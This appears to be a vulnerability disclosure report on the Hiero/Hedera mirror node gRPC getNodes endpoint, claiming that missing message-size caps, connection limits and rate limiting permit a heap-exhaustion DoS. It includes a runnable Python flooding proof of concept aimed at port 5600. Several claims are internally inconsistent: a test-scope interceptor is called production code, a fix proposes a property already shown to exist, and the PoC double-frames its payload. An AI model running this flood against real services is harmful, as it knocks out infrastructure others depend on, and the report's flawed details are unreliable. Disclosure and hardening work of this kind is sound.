### Title
Unbounded Parallel Connections with No Message-Size Cap or Rate Limiting on gRPC `getNodes` Enables Amplified DoS

### Summary
The gRPC server for `NetworkController.getNodes()` configures no explicit `maxInboundMessageSize`, no per-IP connection limit, and no application-level rate limiting. An unprivileged attacker can open an arbitrary number of connections and flood each with up to 4 MB malformed `AddressBookQuery` payloads (the gRPC-Java default ceiling), forcing the framework to allocate and attempt to deserialize those buffers before `getNodes()` is ever called, exhausting heap and CPU across the JVM.

### Finding Description

**Code path:**

`GrpcConfiguration.java` is the sole place where the Netty server is customized:

```java
// grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java  lines 27-35
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
};
```

`maxInboundMessageSize()` is never called. The gRPC-Java/Netty default is **4 MB per message**. [1](#0-0) 

`NettyProperties` exposes only `maxConcurrentCallsPerConnection` (default 5); there is no `maxInboundMessageSize`, no connection-count cap, and no rate-limit property for the gRPC module: [2](#0-1) 

The only production `ServerInterceptor` found is a test-scope class that only sets an endpoint-context string — no rate limiting, no IP throttling: [3](#0-2) 

The web3 module has a full `ThrottleConfiguration` with bucket4j rate limiting, but **no equivalent exists for the gRPC module**: [4](#0-3) 

**Root cause / failed assumption:** The code assumes that `maxConcurrentCallsPerConnection=5` is sufficient to bound resource usage. It is not: it limits concurrency *per connection* but places no cap on the total number of connections from a single IP, and no cap on inbound message size below the 4 MB framework default.

**Exploit flow:**
1. Attacker opens *N* TCP connections to port 5600 (no connection-count limit enforced).
2. On each connection, attacker sends 5 concurrent HTTP/2 DATA frames carrying a 4 MB blob framed as a gRPC message for `com.hedera.mirror.api.proto.NetworkService/getNodes`.
3. The Netty transport reads each 4 MB buffer into heap memory and passes it to the protobuf deserializer to parse as `AddressBookQuery` — this happens **before** `getNodes()` is invoked.
4. Deserialization of a 4 MB garbage blob as a simple two-field message iterates over every byte looking for valid field tags; it fails, but only after consuming CPU proportional to message size.
5. With *N* = 200 connections: 200 × 5 × 4 MB = **4 GB** of simultaneous heap allocation for message buffers alone, plus proportional CPU for failed deserialization.

### Impact Explanation
Heap exhaustion triggers GC pressure or OOM in the JVM, stalling all gRPC handlers including legitimate address-book queries. Because the address book is how Hedera clients discover consensus nodes, a sustained attack that makes `getNodes` unavailable prevents clients from learning the current network topology, effectively blocking new transaction submission to the network. This matches the "Critical: Network not being able to confirm new transactions" severity tier.

### Likelihood Explanation
No authentication is required. The attacker needs only a network path to port 5600 and the ability to open many TCP connections — trivially achievable from a single host or a small botnet. The attack is fully repeatable and stateless (each request is independent). The GCP `maxRatePerEndpoint: 250` in the Helm chart provides partial mitigation in GCP-managed deployments, but the docker-compose deployment path has no such protection, and the limit applies to request rate, not connection count or message size. [5](#0-4) 

### Recommendation
1. **Explicitly cap inbound message size** in `GrpcConfiguration` to a value appropriate for `AddressBookQuery` (a few hundred bytes is sufficient):
   ```java
   serverBuilder.maxInboundMessageSize(4096); // AddressBookQuery needs < 100 bytes
   ```
2. **Add a total-connection limit** via `NettyServerBuilder.maxConnectionAge` / `maxConnectionIdle` and a connection-count cap.
3. **Add application-level rate limiting** for the gRPC endpoint, mirroring the bucket4j `ThrottleConfiguration` already present in the web3 module, applied via a `@GlobalServerInterceptor`.
4. **Add `maxConcurrentCallsPerConnection` to `NettyProperties`** and expose a `maxConnections` property so operators can tune both.

### Proof of Concept
```python
import grpc
import threading

# Craft a 4 MB payload that is valid HTTP/2 gRPC framing but garbage protobuf
payload = b'\x00' + (4 * 1024 * 1024).to_bytes(4, 'big') + b'\xff' * (4 * 1024 * 1024)

def flood(i):
    channel = grpc.insecure_channel('mirror-node-grpc:5600')
    # Use raw low-level call to bypass client-side protobuf encoding
    stub = channel.unary_unary(
        '/com.hedera.mirror.api.proto.NetworkService/getNodes',
        request_serializer=lambda x: x,
        response_deserializer=lambda x: x,
    )
    futures = [stub.future(payload) for _ in range(5)]  # 5 concurrent per connection
    for f in futures:
        try: f.result()
        except: pass

threads = [threading.Thread(target=flood, args=(i,)) for i in range(200)]
for t in threads: t.start()
for t in threads: t.join()
# Monitor mirror-node JVM heap: expect OOM or severe GC pauses within seconds
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L27-35)
```java
    @Bean
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L1-17)
```java
// SPDX-License-Identifier: Apache-2.0

package org.hiero.mirror.grpc.config;

import jakarta.validation.constraints.Min;
import lombok.Data;
import org.springframework.validation.annotation.Validated;

@Data
@Validated
public class NettyProperties {

    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}


```

**File:** grpc/src/test/java/org/hiero/mirror/grpc/interceptor/GrpcInterceptor.java (L13-21)
```java
public class GrpcInterceptor implements ServerInterceptor {

    @Override
    public <ReqT, RespT> ServerCall.Listener<ReqT> interceptCall(
            ServerCall<ReqT, RespT> call, Metadata headers, ServerCallHandler<ReqT, RespT> next) {
        final var fullMethod = call.getMethodDescriptor().getFullMethodName();
        final var methodName = fullMethod.substring(fullMethod.lastIndexOf('.') + 1);
        EndpointContext.setCurrentEndpoint(methodName);
        return next.startCall(call, headers);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java (L14-55)
```java
@Configuration(proxyBeanMethods = false)
@RequiredArgsConstructor
public class ThrottleConfiguration {

    public static final String GAS_LIMIT_BUCKET = "gasLimitBucket";
    public static final String RATE_LIMIT_BUCKET = "rateLimitBucket";
    public static final String OPCODE_RATE_LIMIT_BUCKET = "opcodeRateLimitBucket";

    private final ThrottleProperties throttleProperties;

    @Bean(name = RATE_LIMIT_BUCKET)
    Bucket rateLimitBucket() {
        long rateLimit = throttleProperties.getRequestsPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(limit).build();
    }

    @Bean(name = GAS_LIMIT_BUCKET)
    Bucket gasLimitBucket() {
        long gasLimit = throttleProperties.getGasPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(gasLimit)
                .refillGreedy(gasLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder()
                .withSynchronizationStrategy(SynchronizationStrategy.SYNCHRONIZED)
                .addLimit(limit)
                .build();
    }

    @Bean(name = OPCODE_RATE_LIMIT_BUCKET)
    Bucket opcodeRateLimitBucket() {
        long rateLimit = throttleProperties.getOpcodeRequestsPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(limit).build();
    }
```

**File:** charts/hedera-mirror-grpc/values.yaml (L69-69)
```yaml
      maxRatePerEndpoint: 250  # Requires a change to HPA to take effect
```
